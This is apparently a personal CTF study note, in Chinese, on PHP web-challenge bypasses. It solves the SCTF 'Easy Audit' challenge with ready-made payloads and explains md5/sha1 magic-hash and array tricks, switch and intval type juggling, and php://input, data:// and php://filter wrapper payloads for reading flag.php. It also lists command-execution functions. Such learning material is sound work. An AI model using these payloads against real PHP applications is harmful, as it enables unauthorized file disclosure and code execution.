# PHP语法专区

具体PHP语法查询官方手册：[官方手册](http://www.php.net/manual/zh/index.php)



## Easy Audit（SCTF）

参考wp：https://www.cnblogs.com/magic123/articles/17489624.html



源码：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..');
    }
}

if($_SERVER){
    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('waf..');
}

if(isset($_GET['yulige'])){
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!
        die('waf..');
    }else{
        if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun'){
            $getflag = file_get_contents($_GET['flag']);
        }
        if(isset($getflag) && $getflag === 'ccc_liubi'){
            include 'flag.php';
            echo $flag;
        }else die('waf..');
    }
}


?>
```





`$_REQUEST` 是一个超全局数组，包含GET、POST、COOKIE输一局，如果有请求数据，那么这个条件为真



`foreach($_REQUEST as $key => $value)` 遍历`$_REQUEST` 数组的每一个键值对



`preg_match('/[a-zA-Z]/i',$value)` 无论大小写进行匹配



`preg_match('/nctfisfun$/', $_GET['nctf'])` 检查是不是以nctfisfun结尾



分析：

```php
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..');
    }
}
```

post，get，cookie传进去的数据变为键值对，并且不能含有字母



```php
if($_SERVER){
    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('waf..');
}
```

判断url后的内容，就是get请求的内容不能含有yulige、flag、nctf

$_SERVER[‘QUERY_STRING’]匹配的是原始数据，就是没有url编码过的数据，所以可以使用url编码绕过



重点在于，`$_REQUESTS` 中POST和GET同时传同名数据，POST会覆盖GET

这样我们可以让POST传数字，GET传字母，就可以绕过

```
POST DATA:
yulige=1&flag=1&nctf=1
```



```php
if(isset($_GET['yulige'])){
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!
        die('waf..');
    }
```

这要求变量前32位的值要和变量的MD5值相同，===，这里采用传入数组返回null进行绕过



```php
else{
        if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun'){
            $getflag = file_get_contents($_GET['flag']);
        }
        else die('waf..');
    }
```

nctf变量的值不能等于nctfisfun，但是preg_match又要匹配到nctfisfun，但是正则只限制了要以nctfisfun结尾，没有限制开头，所以这里选择在开头随便加东西就可以了，即

```
nctf=1nctfisfun
```





```php
if(isset($getflag) && $getflag === 'ccc_liubi'){
            include 'flag.php';
            echo $flag;
        }
```

又要求flag的值要==='ccc_liubi',选择使用data协议绕过

```
flag=data://text/plain;base64,Y2NjX2xpdWJp
```

`ccc_liubi` base64编码为 `Y2NjX2xpdWJp`



PayLoad:

```
?yulinge[]=null&nctf=nnctfisfun&flag=data://text/plain;base64,Y2NjX2xpdWJp
```

```
?%79%75%6C%69%67%65[]=1&%6E%63%74%66=%6E%63%74%66%69%73%66%75%6E%0a&%66%6C%61%67=data://text/plain;base64,Y2NjX2xpdWJp
```

POST DATA:

```
yulige=1&nctf=1&flag=1
```



### 超全局数组



`$_REQUEST`、`$_SERVER` 和 `$_GET` 是 PHP 的超全局数组，能够在任何作用域中访问，不需要声明。



1. `$_REQUEST`

- **定义**：包含来自用户输入的所有请求数据，整合了 `$_GET`、`$_POST` 和 `$_COOKIE` 的数据。
- **使用场景**：适合处理表单提交和用户请求，但由于整合性，可能导致不必要的安全风险。例如，如果同时使用 GET 和 POST，可能难以追踪数据来源。
- **访问方式**：可以通过 `$value = $_REQUEST['key'];` 获取数据。

2. `$_SERVER`

- **定义**：包含关于服务器环境的信息，提供有关请求的各种信息，比如请求方法、用户代理、服务器名等。
- 常用键：
  - `$_SERVER['REQUEST_METHOD']`：获取请求的方法（GET、POST等）。
  - `$_SERVER['HTTP_USER_AGENT']`：获取用户代理字符串，表示客户端浏览器信息。
  - `$_SERVER['QUERY_STRING']`：获取 URL 中的查询字符串。
- **使用场景**：用于获取请求的上下文信息和服务器的环境信息。

3. `$_GET`

- **定义**：专门用于存储通过 URL 查询字符串传递的参数。只包含 GET 请求中的数据。
- **使用场景**：适合用于获取简单的数据，如搜索表单提交等。数据以键值对的形式存在，查询字符串的格式通常是 `?key1=value1&key2=value2`。
- **访问方式**：通过 `$_GET['key']` 访问特定的参数值。



## Switch漏洞



Switch会自动进行类型转换，比如将1a转为1进行条件匹配，所以在某些情况下可以进行绕过



例如下面的程序，看switch中id要为1才能文件包含，但是上面又有判断==‘1’的时候限制，所以我们直接传1e之类的数据，就可以绕过。

```php
$id=$_POST['id'];
if($id=='1'){
    die("Hacker");
}

switch($id){
    case 0:
        die("1");
    case 1:
        die("hahaha");
        include(flag.php);
    case 2:
        die("hacker");
        
}
```





## md5限制

```php
md5(string $string[,bool $binary]);
```

`binary` 设置为true，那么将以16字符长度的原始二进制格式返回,否则返回32字符长度的十六进制字符串



```php
if(md5($a)===md5($b)){
	echo $flag;
}
```



数组绕过

```
?a[]=1&b[]=2
```



进行绕过



如果遇到这种情况：

```php
<?php
include("flag.php");
$a=(string)$a;
$b=(string)$b;
if(($a!==$b)&&(md5($a)==md5($b))){
	echo $flag;
}
?>
```



数组绕过无法使用的时候就可以使用一些值经过md5之后出现0e开头的，就可以绕过了

如：

```
a=QNKCDZO&b=240610708
```







## sha1函数

```php
sha1(string $string[,bool $binary]);
```

`binary` 设置为true，那么将以20字符长度的原始二进制格式返回，否则返回40字符长度的十六进制数



绕过方式和md5函数绕过一致



## preg_match函数

```php
preg_match( string $patten,string $subject [,array &$matches [, int $flag = 0 [, int $offset = 0]]])
```



正则匹配函数，返回值为int类型，数值为0或1，0表示匹配失败，1表示匹配成功



`$pattern` 搜索的模式，字符串形式

`$subject` 输入字符串



一个正则匹配网站：[正则匹配](https://regex101.com)

正则表达式入门网站：[正则表达式入门教程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/regexp/regexp-wx-tutorial.html)



案例：

```php
<?php
    echo preg_match("/\d+/","123123");	// return 1
	echo preg_match("/\d+/","asdasd");	// return 0
?>
```



特性





## intval函数



```php
int intval (mixed $var [,int $base =10]);
```

获取变量的整数值



`$var` 转换成integer的数量值

`$base` 转化所使用的进制，为0的话就会检测`$var`的格式进行决定进制



案例：

正常识别数字，小数截取，正负数识别

```php
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
```



`$base` 参数设置，为0就根据参数形式进行转换，设置为数字，就多少进制转换，0b??二进制，0???八进制，0x??十六进制

```php
echo intval('0x1A');                  // 0
echo intval('0x1A', 0);               // 26
echo intval(0x1A);                    // 26

echo intval(042);                     // 34
echo intval('042');                   // 42


echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
```



科学计数法

```php
echo intval(1e10);                    // 10000000000
echo intval('1e10');                  // 10000000000
```



溢出

```php
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // -4275113695319687168
echo intval('420000000000000000000'); // 9223372036854775807
```



布尔值和数组转换

```php
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
echo intval(false);                   // 0
echo intval(true);                    // 1
```





## strpos函数

查找字符串首次出现的位置

```php
echo strpos("bcdead","a");		// return 4
```





## is_numeric函数

检测变量是否是数字或者数字字符串





## strcmp函数

该函数对两个字符串进行比较，该比较区分大小写

```php
strcmp($string1,$string2);
```

如果 `string1` 小于 `string2` 返回-1，如果 `string1` 大于 `string2`  返回1 ，两者相等，返回0 



## file_get_contents函数

没有回显，需要echo出来



## show_source函数

直接回显

## highlight_file函数

直接回显

## readfile函数

直接回显



## eval函数

重点函数

将字符串内容当作php代码执行



## popen函数

该函数也是可以命令执行的

```php
<?php
    echo fgets(popen("whoami","r"));
?>
```



## 命令执行函数

eval

system

passthu

shell_exec

exec

popen





## 弱类型比较

==

===



## 伪协议



利用伪协议绕过

```
if(file_get_contents($file2) === "hello ctf")
```



`php://input` 伪协议绕过

```
?xxx=php://input
```

POST数据：

```
hello ctf
```

即可绕过



`data://` 伪协议绕过

```
?xxx=data://text/plain;base64,
```

后面加上需要匹配的内容的base64编码

或者

```
?xxx=data://text/plain,
```

后面加上url编码内容





需要注意一下，有时候hackbar会犯病，时常发出去的还是显示缓存页面



include包含文件有时候没有回显，所以需要：

使用 `php://filter/read=convert.base64-encode/resource=` 进行读取

```
?file1=php://filter/read=convert.base64-encode/resource=flag.php
```



```
?filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php
```

